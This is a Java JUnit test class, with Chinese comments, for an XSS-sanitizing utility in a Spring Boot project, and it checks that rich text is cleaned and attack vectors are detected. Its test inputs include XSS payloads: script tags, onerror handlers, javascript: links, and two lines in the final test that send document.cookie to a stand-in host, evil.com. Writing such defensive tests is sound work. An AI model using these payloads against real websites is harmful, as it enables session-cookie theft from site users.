package com.mio.ai.common.utils;

import lombok.extern.slf4j.Slf4j;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.boot.test.context.SpringBootTest;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * XSS 防护工具测试类
 */
@SpringBootTest
@Slf4j
class XssUtilsTest {

    @Test
    @DisplayName("cleanRichText: 应移除 script 标签")
    void cleanRichText_shouldRemoveScriptTag() {
        String input = "<p>正常内容</p><script>alert('xss')</script>";
        String result = XssUtils.cleanRichText(input);
        log.info(result);
        assertThat(result).doesNotContain("<script>");
        assertThat(result).doesNotContain("alert");
        assertThat(result).contains("<p>正常内容</p>");
    }

    @Test
    @DisplayName("cleanRichText: 应移除事件处理器")
    void cleanRichText_shouldRemoveEventHandlers() {
        String input = "<img src=x onerror=alert('xss')>";
        String result = XssUtils.cleanRichText(input);
        log.info(result);
        assertThat(result).doesNotContain("onerror");
        assertThat(result).doesNotContain("alert");
    }

    @Test
    @DisplayName("cleanRichText: 应保留安全的 Markdown 标签")
    void cleanRichText_shouldKeepSafeTags() {
        String input = "<h1>标题</h1><p>段落</p><pre><code>code</code></pre><ul><li>列表</li></ul>";
        String result = XssUtils.cleanRichText(input);
        log.info(result);
        assertThat(result).contains("<h1>标题</h1>");
        assertThat(result).contains("<p>段落</p>");
        assertThat(result).contains("<pre>");
        assertThat(result).contains("<code>code</code>");
        assertThat(result).contains("<ul><li>列表</li></ul>");
    }

    @Test
    @DisplayName("cleanRichText: 应移除 javascript: 协议链接")
    void cleanRichText_shouldRemoveJavaScriptProtocol() {
        String input = "<a href=\"javascript:alert('xss')\">点击</a>";
        String result = XssUtils.cleanRichText(input);
        log.info(result);
        assertThat(result).doesNotContain("javascript:");
    }

    @Test
    @DisplayName("cleanRichText: 应保留 http/https 链接")
    void cleanRichText_shouldKeepHttpLinks() {
        String input = "<a href=\"https://example.com\">链接</a>";
        String result = XssUtils.cleanRichText(input);
        log.info(result);
        assertThat(result).contains("https://example.com");
    }

    @Test
    @DisplayName("cleanRichText: 空值和 null 处理")
    void cleanRichText_shouldHandleNullAndEmpty() {
        assertThat(XssUtils.cleanRichText(null)).isNull();
        assertThat(XssUtils.cleanRichText("")).isEmpty();
    }

    @Test
    @DisplayName("cleanStrict: 应移除大部分 HTML 标签")
    void cleanStrict_shouldRemoveMostTags() {
        String input = "<h1>标题</h1><script>alert(1)</script><b>加粗</b>";
        String result = XssUtils.cleanStrict(input);
        log.info(result);
        assertThat(result).doesNotContain("<h1>");
        assertThat(result).doesNotContain("<script>");
        assertThat(result).contains("<b>加粗</b>");
    }

    @Test
    @DisplayName("escapeHtml: 应将所有 HTML 标签转为实体")
    void escapeHtml_shouldEncodeAllTags() {
        String input = "<p>内容</p><script>alert(1)</script>";
        String result = XssUtils.escapeHtml(input);
        log.info(result);
        assertThat(result).doesNotContain("<p>");
        assertThat(result).contains("&lt;p&gt;");
        assertThat(result).contains("&lt;script&gt;");
    }

    @Test
    @DisplayName("containsXssRisk: 应识别常见 XSS 攻击向量")
    void containsXssRisk_shouldDetectCommonVectors() {
        assertThat(XssUtils.containsXssRisk("<script>alert(1)</script>")).isTrue();
        assertThat(XssUtils.containsXssRisk("javascript:alert(1)")).isTrue();
        assertThat(XssUtils.containsXssRisk("<img src=x onerror=alert(1)>")).isTrue();
        assertThat(XssUtils.containsXssRisk("<iframe src='evil.com'>")).isTrue();
        assertThat(XssUtils.containsXssRisk("<object data='evil.swf'>")).isTrue();
        assertThat(XssUtils.containsXssRisk("<form action='evil.com'>")).isTrue();
    }

    @Test
    @DisplayName("containsXssRisk: 正常内容不应误报")
    void containsXssRisk_shouldNotFalsePositive() {
        assertThat(XssUtils.containsXssRisk("这是一个正常的消息内容")).isFalse();
        assertThat(XssUtils.containsXssRisk("<p>正常的 HTML 段落</p>")).isFalse();
        assertThat(XssUtils.containsXssRisk("")).isFalse();
        assertThat(XssUtils.containsXssRisk(null)).isFalse();
    }

    @Test
    @DisplayName("综合场景: Markdown 内容中的 XSS 攻击")
    void comprehensive_markdownXssAttack() {
        String maliciousMarkdown = """
            # 正常标题
            
            这是一段正常内容。
            
            <script>document.location='https://evil.com?cookie='+document.cookie</script>
            
            <img src="x" onerror="fetch('https://evil.com/steal?d='+document.cookie)">
            
            [正常链接](https://example.com)
            [恶意链接](javascript:alert('xss'))
            
            ```java
            System.out.println("代码块应保留");
            ```
            """;

        String cleaned = XssUtils.cleanRichText(maliciousMarkdown);

        log.info(cleaned);

        // 危险内容应被移除
        assertThat(cleaned).doesNotContain("<script>");
        assertThat(cleaned).doesNotContain("document.cookie");
        assertThat(cleaned).doesNotContain("onerror");
        assertThat(cleaned).doesNotContain("javascript:");

        // 安全内容应保留
        assertThat(cleaned).contains("# 正常标题");
        assertThat(cleaned).contains("https://example.com");
    }
}
